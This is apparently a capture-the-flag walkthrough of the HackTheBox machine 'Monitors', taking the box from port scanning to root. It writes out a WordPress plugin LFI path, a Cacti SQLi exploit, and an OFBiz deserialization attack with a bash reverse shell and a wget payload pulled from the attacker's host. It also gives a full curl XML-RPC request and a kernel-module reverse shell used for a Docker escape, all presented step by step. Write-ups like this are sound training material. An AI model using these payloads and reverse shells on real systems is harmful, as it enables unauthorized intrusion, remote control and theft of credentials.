# Monitors Hackthebox Walkthrough

## All Ports Scan

```bash
# Nmap 7.91 scan initiated Mon Jun 28 09:13:37 2021 as: nmap -T4 -sT -vv -p- -oA nmap/allports 10.10.10.238
Increasing send delay for 10.10.10.238 from 5 to 10 due to 11 out of 25 dropped probes since last increase.
Nmap scan report for 10.10.10.238
Host is up, received echo-reply ttl 63 (0.16s latency).
Scanned at 2021-06-28 09:13:37 EDT for 841s
Not shown: 65533 closed ports
Reason: 65533 conn-refused
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
# Nmap done at Mon Jun 28 09:27:38 2021 -- 1 IP address (1 host up) scanned in 840.54 seconds
```

## Complete Scan

```bash
# Nmap 7.91 scan initiated Mon Jun 28 09:14:32 2021 as: nmap -T4 -sT -sC -sV -A -vv -p22,80 -oA nmap/complete 10.10.10.238
Nmap scan report for 10.10.10.238
Host is up, received reset ttl 63 (0.16s latency).
Scanned at 2021-06-28 09:14:33 EDT for 17s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5AeQDHYQGVg8GiNvPYiXYPseampZJusZb2Dbd2d1QIi7a/LGOO9ylbMgjxcve5euzCFBMSX2rVIp8zkUg3CCi7JYLpyQAeP0npjT/fB84dWbzt51Xmfir4qZTpBMf8Lw+ZFxEXv1UkGfejSZ3fjcuZ2hBBeUh63P2qcomVla/eUyR1dOIvJy8K1pl1WSXia6W2fJsBj/uowwe4+aMtWGVlzMNd+Tpp1Z8lg/a2jZTxkdIYvUkx/k0x0xrjsUhGiLgOoAWg4JvKeYoy+v/hhAjh6fB8Kw7jS1t1Si69cPadEQGB8NOMdyDv4EvoG3/8BvLpMgpHKzy1aHsJk9zqyej
|   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKHKAgNKkq5XDcAfsuuxZFMPf+iEHjoq9DUmOmg0cCDgpE90GNOZeoaI24IlwlrSdTWTRA9HNJ7DFyIkcHr37Dk=
|   256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBi/L9gWCzbJ6GzFB1PsHZJco24eJW3wmC+a4Ul6fEe6
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=iso-8859-1).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (94%), Linux 5.0 - 5.3 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=6/28%OT=22%CT=%CU=33821%PV=Y%DS=2%DC=T%G=N%TM=60D9CB4A%P=x86_64-pc-linux-gnu)
SEQ(SP=100%GCD=1%ISR=103%TI=Z%CI=Z%II=I%TS=A)
SEQ(SP=100%GCD=1%ISR=103%TI=Z%CI=Z%TS=A)
OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 35.547 days (since Sun May 23 20:07:42 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   155.35 ms 10.10.14.1
2   155.51 ms 10.10.10.238

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun 28 09:14:50 2021 -- 1 IP address (1 host up) scanned in 18.46 seconds
```

## Enumeration Port 80

![](Images/Pasted%20image%2020210628091858.png)

Wordpress Running on it.

![](Images/Pasted%20image%2020210628091926.png)

Let's run wpscan on it.

```java
┌─[R4hn1]─[10.10.14.12]─[root@V0ld3rm0rt]─[~/Walkthrough/HTB/Monitors]
└────╼ # wpscan --url http://monitors.htb/ -e ap --plugins-detection aggressive --plugins-version-detection aggressive
```

![](Images/Pasted%20image%2020210628092251.png)

```bash
Exploit : 
https://www.exploit-db.com/exploits/44544
```
![](Images/Pasted%20image%2020210628092418.png)

Website is vulnerable to LFI.

```bash
view-source:http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//var/www/wordpress/wp-config.php
```

```sql
/** MySQL database username */
define( 'DB_USER', 'wpadmin' );
/** MySQL database password */
define( 'DB_PASSWORD', 'BestAdministrator@2020!' );
/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );
/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

Its time to convert LFI to RCE.

```bash
marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash
root:x:0:0:root:/root:/bin/bash
```

```java
#!/usr/bin/env python
for x in range(1000):
    print(x)
	
# awk '{print "/proc/self/fd/"$0""}' a.txt > wordlist.txt
```

After struggling hours and hours found nothing tried with /proc/self/fd too but not got any sauce.

So i looked for the default configuration file of apache2

```bash
http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/apache2/sites-enabled/000-default.conf
```

And entry of one subdomain so i move forward to look into that.

![](Images/Pasted%20image%2020210628102556.png)

And while looking into it found one more website is running.

![](Images/Pasted%20image%2020210628102701.png)

Tried with the creds and here we are in.

![](Images/Pasted%20image%2020210628103021.png)

Found it is vulnerable to SQLi.

![](Images/Pasted%20image%2020210628105641.png)

Now search for exploit

```bash
Exploit : https://www.exploit-db.com/exploits/49810
```
We got a shell.

![](Images/Pasted%20image%2020210628111842.png)

## Previlege Escalation

Search for Database credentials

![](Images/Pasted%20image%2020210628112741.png)

```sql
$database_type     = 'mysql';
$database_default  = 'cacti';
$database_hostname = 'localhost';
$database_username = 'cacti';
$database_password = 'cactipass';
$database_port     = '3306';
$database_retries  = 5;
$database_ssl      = false;
$database_ssl_key  = '';
$database_ssl_cert = '';
$database_ssl_ca   = '';
```

Search for multiple way but nothing found intresting so i tried to search for a perticular string in file

![](Images/Pasted%20image%2020210628114013.png)

![](Images/Pasted%20image%2020210628114118.png)

Okay so in the file we got a marcus password.

```bash
Credentials : 
marcus:VerticalEdge2020
```

![](Images/Pasted%20image%2020210628114937.png)

It has running service on port 8443

Let's try to connect it via tunneling.

![](Images/Pasted%20image%2020210628114925.png)

While locating to the port it says it has tomcat running on it.

![](Images/Pasted%20image%2020210628115139.png)

While searching for exploit got it is vulnerable to deserialisation

```bash
https://tomcat.apache.org/security-9.html#Fixed_in_Apache_Tomcat_9.0.35
https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/
```

We got a exploit but for exploiting it we need a parameted of cookies, for that we need a login panel to pass cookies.

![](Images/Pasted%20image%2020210628125540.png)

While enumerating more got the version of running version and a login panel.

![](Images/Pasted%20image%2020210628125641.png)

After searching for hours got a exploit.

```bash
Exploit : 
https://github.com/g33xter/CVE-2020-9496
https://www.programmersought.com/article/93188263701/
```

**Step 1:** Create a Shell File.

```java
┌─[R4hn1]─[10.10.14.12]─[root@V0ld3rm0rt]─[~/Walkthrough/HTB/Monitors]
└────╼ # cat shell.sh 
#!/bin/bash
/bin/bash -i >& /dev/tcp/10.10.14.12/9999 0>&1
```

**Step 2:** Enable Http Server

```java
┌─[R4hn1]─[10.10.14.12]─[root@V0ld3rm0rt]─[~/Walkthrough/HTB/Monitors]
└────╼ # python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

**Step 3:** Download YsoSerial Jar

```bash
https://github.com/frohoff/ysoserial
https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar
```

**Step 4:** Genrating Payload Using YsoSerial Jar

```java
┌─[R4hn1]─[10.10.14.12]─[root@V0ld3rm0rt]─[~/Walkthrough/HTB/Monitors]
└────╼ # java -jar ysoserial.jar CommonsBeanutils1 "wget 10.10.14.12/shell.sh -O /tmp/shell.sh" | base64 | tr -d "\n"
```

**Step 5:** Copy the Output of payload and add it to the curl command. [Replace (Add Your Payload Here Section) with your payload]

```bash
curl https://127.0.0.1:8888/webtools/control/xmlrpc -X POST -v -d '<?xml version="1.0"?><methodCall><methodName>ProjectDiscovery</methodName><params><param><value><struct><member><name>test</name><value><serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">Add your Payload Here</serializable></value></member></struct></value></param></params></methodCall>' -k  -H 'Content-Type:application/xml'
```

**Step 6:** Execute Command

Okay so once we run the command we get a curl back.

![](Images/Pasted%20image%2020210628132349.png)

And once executed it we got a root

![](Images/Pasted%20image%2020210628132637.png)

Here we got a root shell but unable to access root flag.

So while finding more details got one blog.

```bash
Informative :
https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd
```

## More Previlege Required

We need to follow the same step as mentioned in the blog.

**Step 1:** Check the capabilities provided to the docker container.

```java
root@c295f5911877:~# capsh --print
```

![](Images/Pasted%20image%2020210628140044.png)

**Step 2:** Find the IP address of the docker container.

**Step 3:** Write a program to invoke a reverse shell with the help of usermode Helper API.

Create a file in client PC called reverse-shell.c

```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");
char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.12/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}
module_init(reverse_shell_init);
module_exit(reverse_shell_exit)
```

**Step 4:** Create a Makefile to compile the kernel module.

Create a Make file to compile a kernal module.

```c
obj-m +=reverse-shell.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

**Step 5:** Make the kernel module.

![](Images/Pasted%20image%2020210628141118.png)

**Step 6:** Start Listner

**Step 7:** # insmod reverse-shell.ko

![](Images/Pasted%20image%2020210628141307.png)